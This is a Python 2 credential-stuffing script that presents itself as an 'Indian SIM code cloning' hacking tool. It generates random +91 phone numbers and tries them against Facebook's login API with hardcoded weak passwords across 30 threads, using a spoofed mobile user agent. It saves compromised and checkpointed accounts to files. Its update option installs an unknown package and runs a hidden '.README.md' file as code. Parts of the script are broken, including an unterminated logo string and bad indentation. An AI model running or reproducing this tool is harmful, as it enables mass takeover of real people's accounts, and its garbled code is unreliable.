import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(100000):

    nmbr = random.randint(1111111, 9999999)

    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 nmbr.py')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
def exb():
        print '[!] Exit'
        os.sys.exit()

def psb(z):
        for e in z + '\n':
                sys.stdout.write(e)
                sys.stdout.flush()
                time.sleep(0.03)

def t():
    time.sleep(1)
def cb():
    os.system('clear')
##### Dev : Shubhamg0sain#####
##### LOGO #####
                                '''

back = 0
successful = []
cpb = []
oks = []
id = []
def menu():
        os.system('clear')
        print logo
        print "\033[1;92mCYBER_HACKER_GLAXY_R.H.P_1.286-Wellcome"
        print
        print "\033[1;91mATTACK ON INDIAN NETWORKS"
        print "\033[1;92m[1]  ALL SIM CODE CLONING"

        print "\033[1;92m[2]  UPDATE SYSTEM"
        print "\033[1;92m[3]  EXIT_KALTI MAR"
        print 50*'-'
        action()

def action():
        bch = raw_input('\n SELECTED ')
        if bch =='':
                print '[!] Fill in correctly'
                action()
        elif bch =="1":
                os.system("clear")
                print (logo)
                print "\033[1;91mINDIAN  SIM CODE HERE"
                print "\033[1;95m175,165,191, 192, 193, 194, 195, 196, 197, 198, 199'"
                print "\033[1;95mONLY INDIAN SIM CODE CLONING' ,"
                try:
                        c = raw_input(" SELECTE ANY CODE: ")
                        k="+91"
                        idlist = ('.txt')
                        for line in open(idlist,"r").readlines():
                                id.append(line.strip())
                except IOError:
                        print ("[!] File Not Found")
                        raw_input("\n[ Back ]")
                        menu()

        elif bch =="2":
            os.system("clear")
            os.system("pip2 install --upgrade balln")
            os.system("pip2 install --upgrade balln")
            os.system("clear")
            print(logo)
            print
            psb (" Tool has been successfully updated")
            time.sleep(2)
            os.system("python2 .README.md")
#       elif chb =='3':
#           os.system('xdg-open https://www.facebook.com/100002059014174/posts/2677733205638620/?substory_index=0&app=fbl')
#           time.sleep(1)
#           menu()
        elif bch =='3':
                exb()
        else:
                print '[!] Fill in correctly'
                action()

        xxx = str(len(id))
        psb ('[✓] Total Numbers: '+xxx)
        time.sleep(0.5)
        psb ('[✓] Please wait, process is running ...')
        time.sleep(0.5)
        psb ('[✓] Last 07 Digit Crack,india123,india1234 Found ...')
        time.sleep(0.5)
        psb ('[!] Kalti Marne Ke lye(To Exit) Press CTRL Then Press z')
        time.sleep(0.5)
        print 50*'-'
        print


        def main(arg):
                global cpb,oks
                user = arg
                try:
                        os.mkdir('save')
                except OSError:
                        pass
                try:
                        pass1 = '735101'
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                                print '\x1b[1;91mMAFIA-KILLER-HACKED\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass1
                                okb = open('save/successfull.txt', 'a')
                                okb.write(k+c+user+'|'+pass1+'\n')
                                okb.close()
                                oks.append(c+user+pass1)
                        else:
                                if 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;92mOPEN AFTER(7DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass1
                                        cps = open('save/checkpoint.txt', 'a')
                                        cps.write(k+c+user+'|'+pass1+'\n')
                                        cps.close()
                                        cpb.append(c+user+pass1)
                                else:
                                        pass2 = '735102'
                                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                                print '\x1b[1;91mMAFIA-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass2       
                                                okb = open('save/successfull.txt', 'a')
                                                okb.write(k+c+user+'|'+pass2+'\n')
                                                okb.close()
                                                oks.append(c+user+pass2)
                                        else:
                                                if 'www.facebook.com' in q['error_msg']:
                                                        print '\x1b[1;92m0PEN AFTER(7DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass2
                                                        cps = open('save/checkpoint.txt', 'a')
                                                        cps.write(k+c+user+'|'+pass2+'\n')
                                                        cps.close()
                                                        cpb.append(c+user+pass2)
                                                else:
                                                        pass3 = '735103'
                                                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                                        q = json.load(data)
                                                        if 'access_token' in q:
                                                          print '\x1b[1;91mMAFIA-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass3
                                                          okb = open('save/successfull.txt', 'a')
                                                          okb.write(k+c+user+'|'+pass3+'\n')
                                                          okb.close()
                                                          oks.append(c+user+pass3)
                                                        else:
                                                          if 'www.facebook.com' in q['error_msg']:
                                                          print '\x1b[1;92mOPEN AFTER(7DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass3
                                                          cps = open('save/checkpoint.txt', 'a')
                                                          cps.write(k+c+user+'|'+pass3+'\n')
                                                          cps.close()
                                                          cpb.append(c+user+pass3)


                except:
                        pass

        p = ThreadPool(30)
        p.map(main, id)
        print 50*'-'
        print '[✓] Process Has Been Completed ....'
        print '[✓] Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
        print('[✓] CP File Has Been Saved : save/checkpoint.txt')
        raw_input('\n[Press Enter To Go Back]')
        os.system('python2 .README.md')

if __name__ == '__main__':
        menu()







>>>
